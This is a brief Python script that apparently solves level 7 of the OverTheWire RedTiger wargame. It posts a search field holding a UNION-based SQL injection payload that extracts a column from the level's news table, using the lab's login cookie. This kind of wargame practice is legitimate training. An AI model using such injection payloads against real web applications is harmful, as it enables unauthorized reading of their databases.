import requests

cookies = {"level7login": "shitcoins_are_hold"}
url = "https://redtiger.labs.overthewire.org/level7.php"

search = "google% ') union select 1,2,autor,4 from level7_news limit 2,1--\t" # ending with %'
data = {"search":search, "dosearch": "search!"}

r = requests.post(url, cookies=cookies, data=data)
print r.text